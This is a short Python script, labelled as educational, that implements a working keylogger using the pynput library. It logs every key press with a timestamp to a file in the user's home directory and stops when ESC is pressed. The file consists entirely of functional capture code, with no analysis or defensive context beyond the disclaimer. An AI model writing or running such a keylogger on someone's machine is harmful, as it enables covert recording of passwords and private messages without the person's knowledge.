# EDUCATIONAL PURPOSES ONLY
# Created for ethical testing & awareness
# Author: Soham Tayade | www.tamizhanskills.com

from pynput.keyboard import Key, Listener
import logging
import os

# Set file path where logs will be stored
log_dir = os.path.expanduser("~") + "/keylogs/"
if not os.path.exists(log_dir):
    os.makedirs(log_dir)

log_file = log_dir + "keylog.txt"

# Configure logging
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Define the on_press function
def on_press(key):
    try:
        logging.info(f"Key Pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special Key Pressed: {key}")

# Define the on_release function
def on_release(key):
    if key == Key.esc:
        # Stop listener on ESC key
        return False

# Start listening to the keyboard
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
